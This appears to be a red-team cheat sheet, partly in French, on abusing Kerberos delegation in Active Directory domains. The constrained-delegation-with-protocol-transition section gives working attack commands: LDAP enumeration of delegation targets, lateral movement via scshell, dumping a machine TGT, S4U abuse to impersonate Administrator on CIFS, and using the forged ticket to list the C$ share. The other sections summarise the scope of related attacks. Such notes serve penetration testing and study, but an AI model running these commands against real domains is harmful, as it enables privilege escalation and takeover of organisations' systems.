# Unconstrained Delegation
Users : ceux dont tu captures le TGT en mémoire
Services : n'importe quel service du domaine

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

---
# Constrained Delegation avec Protocol Transition
Users : n'importe lequel (tu choisis librement)
Services : tous les services types (eg. CIFS/HTTP) des Users/Computers listés dans msDS-AllowedToDelegateTo (with rubeus /altservice)

1. Search for computers whose _msDS-AllowedToDelegateTo_ attribute is not null.
```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

2. Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
```
$userAccountControl_value = "16781312"
[System.Convert]::ToBoolean($userAccountControl_value -band 16777216)
```

3. Move laterally to the machine with delegation.
```
jump scshell64 lon-ws-1 smb
```

4. Dump the TGT for the target machine.
```
krb_triage

krb_dump /user:lon-ws-1$ /service:krbtgt
```

5. Perform the S4U abuse to obtain a usable service ticket for _time/lon-dc-1_, substituting the service name for _cifs_.
```
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator /nowrap
```

6. Leverage the ticket to access the C$ share on _lon-fs-1_.
```
make_token CONTOSO\Administrator FakePass

$ticket = "doIFo[...snip...]kNPTQ=="

[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String($ticket))

kerberos_ticket_use C:\Users\Attacker\Desktop\ticket.kirbi

ls \\lon-fs-1\C$
```

---
# Constrained Delegation sans Protocol Transition
Users : uniquement ceux dont tu as déjà un TGS pour le service front-end
Services : tous les services types (eg. CIFS/HTTP) des Users/Computers listés dans msDS-AllowedToDelegateTo (with rubeus /altservice)

---
# S4U2self Computer Takeover (Resource-Based / abus direct)
Users : n'importe lequel (tu choisis librement, ici Administrator)
Services : uniquement les services types (eg. CIFS/HTTP) de la machine elle-même dont tu possèdes le TGT (with rubeus /self + /altservice)
Le point qui distingue cette section des trois autres : il n'y a aucune entrée dans msDS-AllowedToDelegateTo ni aucune délégation configurée. Tu es limité à la machine dont tu détiens le TGT, car la réécriture de SPN ne fonctionne que sur ses propres services (ceux qu'elle peut déchiffrer avec sa clé de compte).